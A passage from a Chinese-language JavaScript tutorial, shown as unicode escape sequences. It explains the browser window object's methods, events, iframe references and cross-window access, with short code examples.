\u65b9\u6cd5\u7528\u4e8e\u5c06\u7f51\u9875\u6eda\u52a8\u6307\u5b9a\u8ddd\u79bb\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff1a\u6c34\u5e73\u5411\u53f3\u6eda\u52a8\u7684\u50cf\u7d20\uff0c\u5782\u76f4\u5411\u4e0b\u6eda\u52a8\u7684\u50cf\u7d20\u3002 1 window . scrollBy ( 0 , window . innerHeight ) \u4e0a\u9762\u4ee3\u7801\u7528\u4e8e\u5c06\u7f51\u9875\u5411\u4e0b\u6eda\u52a8\u4e00\u5c4f\u3002 \u5982\u679c\u4e0d\u662f\u8981\u6eda\u52a8\u6574\u4e2a\u6587\u6863\uff0c\u800c\u662f\u8981\u6eda\u52a8\u67d0\u4e2a\u5143\u7d20\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u4e09\u4e2a\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 Element.scrollTop Element.scrollLeft Element.scrollIntoView() window.print() \u00b6 window.print \u65b9\u6cd5\u4f1a\u8df3\u51fa\u6253\u5370\u5bf9\u8bdd\u6846\uff0c\u4e0e\u7528\u6237\u70b9\u51fb\u83dc\u5355\u91cc\u9762\u7684\u201c\u6253\u5370\u201d\u547d\u4ee4\u6548\u679c\u76f8\u540c\u3002 \u5e38\u89c1\u7684\u6253\u5370\u6309\u94ae\u4ee3\u7801\u5982\u4e0b\u3002 1 2 3 document . getElementById ( 'printLink' ). onclick = function () { window . print (); } \u975e\u684c\u9762\u8bbe\u5907\uff08\u6bd4\u5982\u624b\u673a\uff09\u53ef\u80fd\u6ca1\u6709\u6253\u5370\u529f\u80fd\uff0c\u8fd9\u65f6\u53ef\u4ee5\u8fd9\u6837\u5224\u65ad\u3002 1 2 3 if ( typeof window . print === 'function' ) { // \u652f\u6301\u6253\u5370\u529f\u80fd } window.focus()\uff0cwindow.blur() \u00b6 window.focus() \u65b9\u6cd5\u4f1a\u6fc0\u6d3b\u7a97\u53e3\uff0c\u4f7f\u5176\u83b7\u5f97\u7126\u70b9\uff0c\u51fa\u73b0\u5728\u5176\u4ed6\u7a97\u53e3\u7684\u524d\u9762\u3002 1 2 3 4 5 var popup = window . open ( 'popup.html' , 'Popup Window' ); if (( popup !== null ) && ! popup . closed ) { popup . focus (); } \u4e0a\u9762\u4ee3\u7801\u5148\u68c0\u67e5 popup \u7a97\u53e3\u662f\u5426\u4f9d\u7136\u5b58\u5728\uff0c\u786e\u8ba4\u540e\u6fc0\u6d3b\u8be5\u7a97\u53e3\u3002 window.blur() \u65b9\u6cd5\u5c06\u7126\u70b9\u4ece\u7a97\u53e3\u79fb\u9664\u3002 \u5f53\u524d\u7a97\u53e3\u83b7\u5f97\u7126\u70b9\u65f6\uff0c\u4f1a\u89e6\u53d1 focus \u4e8b\u4ef6\uff1b\u5f53\u524d\u7a97\u53e3\u5931\u53bb\u7126\u70b9\u65f6\uff0c\u4f1a\u89e6\u53d1 blur \u4e8b\u4ef6\u3002 window.getSelection() \u00b6 window.getSelection \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a Selection \u5bf9\u8c61\uff0c\u8868\u793a\u7528\u6237\u73b0\u5728\u9009\u4e2d\u7684\u6587\u672c\u3002 1 var selObj = window . getSelection (); \u4f7f\u7528 Selection \u5bf9\u8c61\u7684 toString \u65b9\u6cd5\u53ef\u4ee5\u5f97\u5230\u9009\u4e2d\u7684\u6587\u672c\u3002 1 var selectedText = selObj . toString (); window.getComputedStyle()\uff0cwindow.matchMedia() \u00b6 window.getComputedStyle() \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u5143\u7d20\u8282\u70b9\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u8be5\u5143\u7d20\u7684\u6700\u7ec8\u6837\u5f0f\u4fe1\u606f\u7684\u5bf9\u8c61\uff0c\u8be6\u89c1\u300aCSS \u64cd\u4f5c\u300b\u4e00\u7ae0\u3002 window.matchMedia() \u65b9\u6cd5\u7528\u6765\u68c0\u67e5 CSS \u7684 mediaQuery \u8bed\u53e5\uff0c\u8be6\u89c1\u300aCSS \u64cd\u4f5c\u300b\u4e00\u7ae0\u3002 window.requestAnimationFrame() \u00b6 window.requestAnimationFrame() \u65b9\u6cd5\u8ddf setTimeout \u7c7b\u4f3c\uff0c\u90fd\u662f\u63a8\u8fdf\u67d0\u4e2a\u51fd\u6570\u7684\u6267\u884c\u3002\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\uff0c setTimeout \u5fc5\u987b\u6307\u5b9a\u63a8\u8fdf\u7684\u65f6\u95f4\uff0c window.requestAnimationFrame() \u5219\u662f\u63a8\u8fdf\u5230\u6d4f\u89c8\u5668\u4e0b\u4e00\u6b21\u91cd\u6d41\u65f6\u6267\u884c\uff0c\u6267\u884c\u5b8c\u624d\u4f1a\u8fdb\u884c\u4e0b\u4e00\u6b21\u91cd\u7ed8\u3002\u91cd\u7ed8\u901a\u5e38\u662f 16ms \u6267\u884c\u4e00\u6b21\uff0c\u4e0d\u8fc7\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u8c03\u8282\u8fd9\u4e2a\u901f\u7387\uff0c\u6bd4\u5982\u7f51\u9875\u5207\u6362\u5230\u540e\u53f0 Tab \u9875\u65f6\uff0c requestAnimationFrame() \u4f1a\u6682\u505c\u6267\u884c\u3002 \u5982\u679c\u67d0\u4e2a\u51fd\u6570\u4f1a\u6539\u53d8\u7f51\u9875\u7684\u5e03\u5c40\uff0c\u4e00\u822c\u5c31\u653e\u5728 window.requestAnimationFrame() \u91cc\u9762\u6267\u884c\uff0c\u8fd9\u6837\u53ef\u4ee5\u8282\u7701\u7cfb\u7edf\u8d44\u6e90\uff0c\u4f7f\u5f97\u7f51\u9875\u6548\u679c\u66f4\u52a0\u5e73\u6ed1\u3002\u56e0\u4e3a\u6162\u901f\u8bbe\u5907\u4f1a\u7528\u8f83\u6162\u7684\u901f\u7387\u91cd\u6d41\u548c\u91cd\u7ed8\uff0c\u800c\u901f\u5ea6\u66f4\u5feb\u7684\u8bbe\u5907\u4f1a\u6709\u66f4\u5feb\u7684\u901f\u7387\u3002 \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u3002 1 window . requestAnimationFrame ( callback ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c callback \u662f\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u3002 callback \u6267\u884c\u65f6\uff0c\u5b83\u7684\u53c2\u6570\u5c31\u662f\u7cfb\u7edf\u4f20\u5165\u7684\u4e00\u4e2a\u9ad8\u7cbe\u5ea6\u65f6\u95f4\u6233\uff08 performance.now() \u7684\u8fd4\u56de\u503c\uff09\uff0c\u5355\u4f4d\u662f\u6beb\u79d2\uff0c\u8868\u793a\u8ddd\u79bb\u7f51\u9875\u52a0\u8f7d\u7684\u65f6\u95f4\u3002 window.requestAnimationFrame() \u7684\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u6574\u6570\uff0c\u8fd9\u4e2a\u6574\u6570\u53ef\u4ee5\u4f20\u5165 window.cancelAnimationFrame() \uff0c\u7528\u6765\u53d6\u6d88\u56de\u8c03\u51fd\u6570\u7684\u6267\u884c\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a window.requestAnimationFrame() \u6267\u884c\u7f51\u9875\u52a8\u753b\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 var element = document . getElementById ( 'animate' ); element . style . position = 'absolute' ; var start = null ; function step ( timestamp ) { if ( ! start ) start = timestamp ; var progress = timestamp - start ; // \u5143\u7d20\u4e0d\u65ad\u5411\u5de6\u79fb\uff0c\u6700\u5927\u4e0d\u8d85\u8fc7200\u50cf\u7d20 element . style . left = Math . min ( progress / 10 , 200 ) + 'px' ; // \u5982\u679c\u8ddd\u79bb\u7b2c\u4e00\u6b21\u6267\u884c\u4e0d\u8d85\u8fc7 2000 \u6beb\u79d2\uff0c // \u5c31\u7ee7\u7eed\u6267\u884c\u52a8\u753b if ( progress < 2000 ) { window . requestAnimationFrame ( step ); } } window . requestAnimationFrame ( step ); \u4e0a\u9762\u4ee3\u7801\u5b9a\u4e49\u4e86\u4e00\u4e2a\u7f51\u9875\u52a8\u753b\uff0c\u6301\u7eed\u65f6\u95f4\u662f2\u79d2\uff0c\u4f1a\u8ba9\u5143\u7d20\u5411\u53f3\u79fb\u52a8\u3002 window.requestIdleCallback() \u00b6 window.requestIdleCallback() \u8ddf setTimeout \u7c7b\u4f3c\uff0c\u4e5f\u662f\u5c06\u67d0\u4e2a\u51fd\u6570\u63a8\u8fdf\u6267\u884c\uff0c\u4f46\u662f\u5b83\u4fdd\u8bc1\u5c06\u56de\u8c03\u51fd\u6570\u63a8\u8fdf\u5230\u7cfb\u7edf\u8d44\u6e90\u7a7a\u95f2\u65f6\u6267\u884c\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u67d0\u4e2a\u4efb\u52a1\u4e0d\u662f\u5f88\u5173\u952e\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528 window.requestIdleCallback() \u5c06\u5176\u63a8\u8fdf\u6267\u884c\uff0c\u4ee5\u4fdd\u8bc1\u7f51\u9875\u6027\u80fd\u3002 \u5b83\u8ddf window.requestAnimationFrame() \u7684\u533a\u522b\u5728\u4e8e\uff0c\u540e\u8005\u6307\u5b9a\u56de\u8c03\u51fd\u6570\u5728\u4e0b\u4e00\u6b21\u6d4f\u89c8\u5668\u91cd\u6392\u65f6\u6267\u884c\uff0c\u95ee\u9898\u5728\u4e8e\u4e0b\u4e00\u6b21\u91cd\u6392\u65f6\uff0c\u7cfb\u7edf\u8d44\u6e90\u672a\u5fc5\u7a7a\u95f2\uff0c\u4e0d\u4e00\u5b9a\u80fd\u4fdd\u8bc1\u572816\u6beb\u79d2\u4e4b\u5185\u5b8c\u6210\uff1b window.requestIdleCallback() \u53ef\u4ee5\u4fdd\u8bc1\u56de\u8c03\u51fd\u6570\u5728\u7cfb\u7edf\u8d44\u6e90\u7a7a\u95f2\u65f6\u6267\u884c\u3002 \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u548c\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u3002\u914d\u7f6e\u5bf9\u8c61\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2a\u63a8\u8fdf\u6267\u884c\u7684\u6700\u957f\u65f6\u95f4\uff0c\u5982\u679c\u8fc7\u4e86\u8fd9\u4e2a\u65f6\u95f4\uff0c\u56de\u8c03\u51fd\u6570\u4e0d\u7ba1\u7cfb\u7edf\u8d44\u6e90\u6709\u65e0\u7a7a\u95f2\uff0c\u90fd\u4f1a\u6267\u884c\u3002 1 window . requestIdleCallback ( callback [, options ]) callback \u53c2\u6570\u662f\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u3002\u8be5\u56de\u8c03\u51fd\u6570\u6267\u884c\u65f6\uff0c\u7cfb\u7edf\u4f1a\u4f20\u5165\u4e00\u4e2a IdleDeadline \u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u3002 IdleDeadline \u5bf9\u8c61\u6709\u4e00\u4e2a didTimeout \u5c5e\u6027\uff08\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u4e3a\u8d85\u65f6\u8c03\u7528\uff09\u548c\u4e00\u4e2a timeRemaining() \u65b9\u6cd5\uff08\u8fd4\u56de\u8be5\u7a7a\u95f2\u65f6\u6bb5\u5269\u4f59\u7684\u6beb\u79d2\u6570\uff09\u3002 options \u53c2\u6570\u662f\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\uff0c\u76ee\u524d\u53ea\u6709 timeout \u4e00\u4e2a\u5c5e\u6027\uff0c\u7528\u6765\u6307\u5b9a\u56de\u8c03\u51fd\u6570\u63a8\u8fdf\u6267\u884c\u7684\u6700\u5927\u6beb\u79d2\u6570\u3002\u8be5\u53c2\u6570\u53ef\u9009\u3002 window.requestIdleCallback() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u3002\u8be5\u6574\u6570\u53ef\u4ee5\u4f20\u5165 window.cancelIdleCallback() \u53d6\u6d88\u56de\u8c03\u51fd\u6570\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 requestIdleCallback ( myNonEssentialWork ); function myNonEssentialWork ( deadline ) { while ( deadline . timeRemaining () > 0 ) { doWorkIfNeeded (); } } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c requestIdleCallback() \u7528\u6765\u6267\u884c\u975e\u5173\u952e\u4efb\u52a1 myNonEssentialWork \u3002\u8be5\u4efb\u52a1\u5148\u786e\u8ba4\u672c\u6b21\u7a7a\u95f2\u65f6\u6bb5\u6709\u5269\u4f59\u65f6\u95f4\uff0c\u7136\u540e\u624d\u771f\u6b63\u5f00\u59cb\u6267\u884c\u4efb\u52a1\u3002 \u4e0b\u9762\u662f\u6307\u5b9a timeout \u7684\u4f8b\u5b50\u3002 1 requestIdleCallback ( processPendingAnalyticsEvents , { timeout : 2000 }); \u4e0a\u9762\u4ee3\u7801\u6307\u5b9a\uff0c processPendingAnalyticsEvents \u5fc5\u987b\u5728\u672a\u67652\u79d2\u4e4b\u5185\u6267\u884c\u3002 \u5982\u679c\u7531\u4e8e\u8d85\u65f6\u5bfc\u81f4\u56de\u8c03\u51fd\u6570\u6267\u884c\uff0c\u5219 deadline.timeRemaining() \u8fd4\u56de 0 \uff0c deadline.didTimeout \u8fd4\u56de true \u3002 \u5982\u679c\u591a\u6b21\u6267\u884c window.requestIdleCallback() \uff0c\u6307\u5b9a\u591a\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u90a3\u4e48\u8fd9\u4e9b\u56de\u8c03\u51fd\u6570\u5c06\u6392\u6210\u4e00\u4e2a\u961f\u5217\uff0c\u6309\u7167\u5148\u8fdb\u5148\u51fa\u7684\u987a\u5e8f\u6267\u884c\u3002 \u4e8b\u4ef6 \u00b6 window \u5bf9\u8c61\u53ef\u4ee5\u63a5\u6536\u4ee5\u4e0b\u4e8b\u4ef6\u3002 load \u4e8b\u4ef6\u548c onload \u5c5e\u6027 \u00b6 load \u4e8b\u4ef6\u53d1\u751f\u5728\u6587\u6863\u5728\u6d4f\u89c8\u5668\u7a97\u53e3\u52a0\u8f7d\u5b8c\u6bd5\u65f6\u3002 window.onload \u5c5e\u6027\u53ef\u4ee5\u6307\u5b9a\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\u3002 1 2 3 4 5 6 7 window . onload = function () { var elements = document . getElementsByClassName ( 'example' ); for ( var i = 0 ; i < elements . length ; i ++ ) { var elt = elements [ i ]; // ... } }; \u4e0a\u9762\u4ee3\u7801\u5728\u7f51\u9875\u52a0\u8f7d\u5b8c\u6bd5\u540e\uff0c\u83b7\u53d6\u6307\u5b9a\u5143\u7d20\u5e76\u8fdb\u884c\u5904\u7406\u3002 error \u4e8b\u4ef6\u548c onerror \u5c5e\u6027 \u00b6 \u6d4f\u89c8\u5668\u811a\u672c\u53d1\u751f\u9519\u8bef\u65f6\uff0c\u4f1a\u89e6\u53d1 window \u5bf9\u8c61\u7684 error \u4e8b\u4ef6\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 window.onerror \u5c5e\u6027\u5bf9\u8be5\u4e8b\u4ef6\u6307\u5b9a\u56de\u8c03\u51fd\u6570\u3002 1 2 3 window . onerror = function ( message , filename , lineno , colno , error ) { console . log ( \"\u51fa\u9519\u4e86\uff01--> %s\" , error . stack ); }; \u7531\u4e8e\u5386\u53f2\u539f\u56e0\uff0c window \u7684 error \u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\u4e0d\u63a5\u53d7\u9519\u8bef\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u800c\u662f\u4e00\u5171\u53ef\u4ee5\u63a5\u53d7\u4e94\u4e2a\u53c2\u6570\uff0c\u5b83\u4eec\u7684\u542b\u4e49\u4f9d\u6b21\u5982\u4e0b\u3002 \u51fa\u9519\u4fe1\u606f \u51fa\u9519\u811a\u672c\u7684\u7f51\u5740 \u884c\u53f7 \u5217\u53f7 \u9519\u8bef\u5bf9\u8c61 \u8001\u5f0f\u6d4f\u89c8\u5668\u53ea\u652f\u6301\u524d\u4e09\u4e2a\u53c2\u6570\u3002 \u5e76\u4e0d\u662f\u6240\u6709\u7684\u9519\u8bef\uff0c\u90fd\u4f1a\u89e6\u53d1 JavaScript \u7684 error \u4e8b\u4ef6\uff08\u5373\u8ba9 JavaScript \u62a5\u9519\uff09\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u53ea\u6709 JavaScript \u811a\u672c\u7684\u9519\u8bef\uff0c\u624d\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u800c\u50cf\u8d44\u6e90\u6587\u4ef6\u4e0d\u5b58\u5728\u4e4b\u7c7b\u7684\u9519\u8bef\uff0c\u90fd\u4e0d\u4f1a\u89e6\u53d1\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u679c\u6574\u4e2a\u9875\u9762\u672a\u6355\u83b7\u9519\u8bef\u8d85\u8fc73\u4e2a\uff0c\u5c31\u663e\u793a\u8b66\u544a\u3002 1 2 3 4 5 6 7 8 window . onerror = function ( msg , url , line ) { if ( onerror . num ++ > onerror . max ) { alert ( 'ERROR: ' + msg + '\\n' + url + ':' + line ); return true ; } } onerror . max = 3 ; onerror . num = 0 ; \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u811a\u672c\u7f51\u5740\u4e0e\u7f51\u9875\u7f51\u5740\u4e0d\u5728\u540c\u4e00\u4e2a\u57df\uff08\u6bd4\u5982\u4f7f\u7528\u4e86 CDN\uff09\uff0c\u6d4f\u89c8\u5668\u6839\u672c\u4e0d\u4f1a\u63d0\u4f9b\u8be6\u7ec6\u7684\u51fa\u9519\u4fe1\u606f\uff0c\u53ea\u4f1a\u63d0\u793a\u51fa\u9519\uff0c\u9519\u8bef\u7c7b\u578b\u662f\u201cScript error.\u201d\uff0c\u884c\u53f7\u4e3a0\uff0c\u5176\u4ed6\u4fe1\u606f\u90fd\u6ca1\u6709\u3002\u8fd9\u662f\u6d4f\u89c8\u5668\u9632\u6b62\u5411\u5916\u90e8\u811a\u672c\u6cc4\u6f0f\u4fe1\u606f\u3002\u4e00\u4e2a\u89e3\u51b3\u65b9\u6cd5\u662f\u5728\u811a\u672c\u6240\u5728\u7684\u670d\u52a1\u5668\uff0c\u8bbe\u7f6e Access-Control-Allow-Origin \u7684 HTTP \u5934\u4fe1\u606f\u3002 1 Access-Control-Allow-Origin: * \u7136\u540e\uff0c\u5728\u7f51\u9875\u7684 <script> \u6807\u7b7e\u4e2d\u8bbe\u7f6e crossorigin \u5c5e\u6027\u3002 1 < script crossorigin = \"anonymous\" src = \"//example.com/file.js\" ></ script > \u4e0a\u9762\u4ee3\u7801\u7684 crossorigin=\"anonymous\" \u8868\u793a\uff0c\u8bfb\u53d6\u6587\u4ef6\u4e0d\u9700\u8981\u8eab\u4efd\u4fe1\u606f\uff0c\u5373\u4e0d\u9700\u8981 cookie \u548c HTTP \u8ba4\u8bc1\u4fe1\u606f\u3002\u5982\u679c\u8bbe\u4e3a crossorigin=\"use-credentials\" \uff0c\u5c31\u8868\u793a\u6d4f\u89c8\u5668\u4f1a\u4e0a\u4f20 cookie \u548c HTTP \u8ba4\u8bc1\u4fe1\u606f\uff0c\u540c\u65f6\u8fd8\u9700\u8981\u670d\u52a1\u5668\u7aef\u6253\u5f00 HTTP \u5934\u4fe1\u606f Access-Control-Allow-Credentials \u3002 window \u5bf9\u8c61\u7684\u4e8b\u4ef6\u76d1\u542c\u5c5e\u6027 \u00b6 \u9664\u4e86\u5177\u5907\u5143\u7d20\u8282\u70b9\u90fd\u6709\u7684 GlobalEventHandlers \u63a5\u53e3\uff0c window \u5bf9\u8c61\u8fd8\u5177\u6709\u4ee5\u4e0b\u7684\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\u5c5e\u6027\u3002 window.onafterprint \uff1a afterprint \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onbeforeprint \uff1a beforeprint \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onbeforeunload \uff1a beforeunload \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onhashchange \uff1a hashchange \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onlanguagechange : languagechange \u7684\u76d1\u542c\u51fd\u6570\u3002 window.onmessage \uff1a message \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onmessageerror \uff1a MessageError \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onoffline \uff1a offline \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.ononline \uff1a online \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onpagehide \uff1a pagehide \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onpageshow \uff1a pageshow \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onpopstate \uff1a popstate \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onstorage \uff1a storage \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onunhandledrejection \uff1a\u672a\u5904\u7406\u7684 Promise \u5bf9\u8c61\u7684 reject \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onunload \uff1a unload \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 \u591a\u7a97\u53e3\u64cd\u4f5c \u00b6 \u7531\u4e8e\u7f51\u9875\u53ef\u4ee5\u4f7f\u7528 iframe \u5143\u7d20\uff0c\u5d4c\u5165\u5176\u4ed6\u7f51\u9875\uff0c\u56e0\u6b64\u4e00\u4e2a\u7f51\u9875\u4e4b\u4e2d\u4f1a\u5f62\u6210\u591a\u4e2a\u7a97\u53e3\u3002\u5982\u679c\u5b50\u7a97\u53e3\u4e4b\u4e2d\u53c8\u5d4c\u5165\u522b\u7684\u7f51\u9875\uff0c\u5c31\u4f1a\u5f62\u6210\u591a\u7ea7\u7a97\u53e3\u3002 \u7a97\u53e3\u7684\u5f15\u7528 \u00b6 \u5404\u4e2a\u7a97\u53e3\u4e4b\u4e2d\u7684\u811a\u672c\uff0c\u53ef\u4ee5\u5f15\u7528\u5176\u4ed6\u7a97\u53e3\u3002\u6d4f\u89c8\u5668\u63d0\u4f9b\u4e86\u4e00\u4e9b\u7279\u6b8a\u53d8\u91cf\uff0c\u7528\u6765\u8fd4\u56de\u5176\u4ed6\u7a97\u53e3\u3002 top \uff1a\u9876\u5c42\u7a97\u53e3\uff0c\u5373\u6700\u4e0a\u5c42\u7684\u90a3\u4e2a\u7a97\u53e3 parent \uff1a\u7236\u7a97\u53e3 self \uff1a\u5f53\u524d\u7a97\u53e3\uff0c\u5373\u81ea\u8eab \u4e0b\u9762\u4ee3\u7801\u53ef\u4ee5\u5224\u65ad\uff0c\u5f53\u524d\u7a97\u53e3\u662f\u5426\u4e3a\u9876\u5c42\u7a97\u53e3\u3002 1 2 3 4 5 if ( window . top === window . self ) { // \u5f53\u524d\u7a97\u53e3\u662f\u9876\u5c42\u7a97\u53e3 } else { // \u5f53\u524d\u7a97\u53e3\u662f\u5b50\u7a97\u53e3 } \u4e0b\u9762\u7684\u4ee3\u7801\u8ba9\u7236\u7a97\u53e3\u7684\u8bbf\u95ee\u5386\u53f2\u540e\u9000\u4e00\u6b21\u3002 1 window . parent . history . back (); \u4e0e\u8fd9\u4e9b\u53d8\u91cf\u5bf9\u5e94\uff0c\u6d4f\u89c8\u5668\u8fd8\u63d0\u4f9b\u4e00\u4e9b\u7279\u6b8a\u7684\u7a97\u53e3\u540d\uff0c\u4f9b window.open() \u65b9\u6cd5\u3001 <a> \u6807\u7b7e\u3001 <form> \u6807\u7b7e\u7b49\u5f15\u7528\u3002 _top \uff1a\u9876\u5c42\u7a97\u53e3 _parent \uff1a\u7236\u7a97\u53e3 _blank \uff1a\u65b0\u7a97\u53e3 \u4e0b\u9762\u4ee3\u7801\u5c31\u8868\u793a\u5728\u9876\u5c42\u7a97\u53e3\u6253\u5f00\u94fe\u63a5\u3002 1 < a href = \"somepage.html\" target = \"_top\" > Link </ a > iframe \u5143\u7d20 \u00b6 \u5bf9\u4e8e iframe \u5d4c\u5165\u7684\u7a97\u53e3\uff0c document.getElementById \u65b9\u6cd5\u53ef\u4ee5\u62ff\u5230\u8be5\u7a97\u53e3\u7684 DOM \u8282\u70b9\uff0c\u7136\u540e\u4f7f\u7528 contentWindow \u5c5e\u6027\u83b7\u5f97 iframe \u8282\u70b9\u5305\u542b\u7684 window \u5bf9\u8c61\u3002 1 2 var frame = document . getElementById ( 'theFrame' ); var frameWindow = frame . contentWindow ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c frame.contentWindow \u53ef\u4ee5\u62ff\u5230\u5b50\u7a97\u53e3\u7684 window \u5bf9\u8c61\u3002\u7136\u540e\uff0c\u5728\u6ee1\u8db3\u540c\u6e90\u9650\u5236\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u8bfb\u53d6\u5b50\u7a97\u53e3\u5185\u90e8\u7684\u5c5e\u6027\u3002 1 2 // \u83b7\u53d6\u5b50\u7a97\u53e3\u7684\u6807\u9898 frameWindow . title <iframe> \u5143\u7d20\u7684 contentDocument \u5c5e\u6027\uff0c\u53ef\u4ee5\u62ff\u5230\u5b50\u7a97\u53e3\u7684 document \u5bf9\u8c61\u3002 1 2 3 4 5 var frame = document . getElementById ( 'theFrame' ); var frameDoc = frame . contentDocument ; // \u7b49\u540c\u4e8e var frameDoc = frame . contentWindow . document ; <iframe> \u5143\u7d20\u9075\u5b88\u540c\u6e90\u653f\u7b56\uff0c\u53ea\u6709\u5f53\u7236\u7a97\u53e3\u4e0e\u5b50\u7a97\u53e3\u5728\u540c\u4e00\u4e2a\u57df\u65f6\uff0c\u4e24\u8005\u4e4b\u95f4\u624d\u53ef\u4ee5\u7528\u811a\u672c\u901a\u4fe1\uff0c\u5426\u5219\u53ea\u6709\u4f7f\u7528 window.postMessage \u65b9\u6cd5\u3002 <iframe> \u7a97\u53e3\u5185\u90e8\uff0c\u4f7f\u7528 window.parent \u5f15\u7528\u7236\u7a97\u53e3\u3002\u5982\u679c\u5f53\u524d\u9875\u9762\u6ca1\u6709\u7236\u7a97\u53e3\uff0c\u5219 window.parent \u5c5e\u6027\u8fd4\u56de\u81ea\u8eab\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u901a\u8fc7 window.parent \u662f\u5426\u7b49\u4e8e window.self \uff0c\u5224\u65ad\u5f53\u524d\u7a97\u53e3\u662f\u5426\u4e3a iframe \u7a97\u53e3\u3002 1 2 3 if ( window . parent !== window . self ) { // \u5f53\u524d\u7a97\u53e3\u662f\u5b50\u7a97\u53e3 } <iframe> \u7a97\u53e3\u7684 window \u5bf9\u8c61\uff0c\u6709\u4e00\u4e2a frameElement \u5c5e\u6027\uff0c\u8fd4\u56de <iframe> \u5728\u7236\u7a97\u53e3\u4e2d\u7684 DOM \u8282\u70b9\u3002\u5bf9\u4e8e\u975e\u5d4c\u5165\u7684\u7a97\u53e3\uff0c\u8be5\u5c5e\u6027\u7b49\u4e8e null \u3002 1 2 3 4 5 var f1Element = document . getElementById ( 'f1' ); var f1Window = f1Element . contentWindow ; f1Window . frameElement === f1Element // true window . frameElement === null // true window.frames \u5c5e\u6027 \u00b6 window.frames \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u6210\u5458\u662f\u6240\u6709\u5b50\u7a97\u53e3\u7684 window \u5bf9\u8c61\u3002\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u5c5e\u6027\uff0c\u5b9e\u73b0\u7a97\u53e3\u4e4b\u95f4\u7684\u4e92\u76f8\u5f15\u7528\u3002\u6bd4\u5982\uff0c frames[0] \u8fd4\u56de\u7b2c\u4e00\u4e2a\u5b50\u7a97\u53e3\uff0c frames[1].frames[2] \u8fd4\u56de\u7b2c\u4e8c\u4e2a\u5b50\u7a97\u53e3\u5185\u90e8\u7684\u7b2c\u4e09\u4e2a\u5b50\u7a97\u53e3\uff0c parent.frames[1] \u8fd4\u56de\u7236\u7a97\u53e3\u7684\u7b2c\u4e8c\u4e2a\u5b50\u7a97\u53e3\u3002 \u6ce8\u610f\uff0c window.frames \u6bcf\u4e2a\u6210\u5458\u7684\u503c\uff0c\u662f\u6846\u67b6\u5185\u7684\u7a97\u53e3\uff08\u5373\u6846\u67b6\u7684 window \u5bf9\u8c61\uff09\uff0c\u800c\u4e0d\u662f iframe \u6807\u7b7e\u5728\u7236\u7a97\u53e3\u7684 DOM \u8282\u70b9\u3002\u5982\u679c\u8981\u83b7\u53d6\u6bcf\u4e2a\u6846\u67b6\u5185\u90e8\u7684 DOM \u6811\uff0c\u9700\u8981\u4f7f\u7528 window.frames[0].document 